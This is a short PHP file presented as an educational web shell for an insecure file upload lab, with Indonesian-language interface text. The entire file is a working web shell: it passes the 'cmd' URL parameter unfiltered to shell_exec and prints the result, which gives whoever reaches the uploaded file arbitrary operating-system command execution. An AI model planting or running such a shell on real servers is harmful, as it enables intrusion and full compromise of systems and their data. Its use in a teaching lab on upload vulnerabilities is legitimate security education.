<?php
/**
 * Sample Educational Web Shell for Insecure File Upload Lab
 * Usage: http://localhost:8000/uploads/webshell.php?cmd=whoami
 */
echo "<h3>=== SecLab Web Shell Execution Sandbox ===</h3>";
if (isset($_GET['cmd'])) {
    $cmd = $_GET['cmd'];
    echo "<strong>Perintah:</strong> " . htmlspecialchars($cmd) . "<br>";
    echo "<pre style='background:#111; color:#0f0; padding:10px; border-radius:5px;'>";
    echo shell_exec($cmd);
    echo "</pre>";
} else {
    echo "<p>Gunakan parameter <code>?cmd=nama_perintah</code> pada URL untuk eksekusi perintah OS.</p>";
}
?>
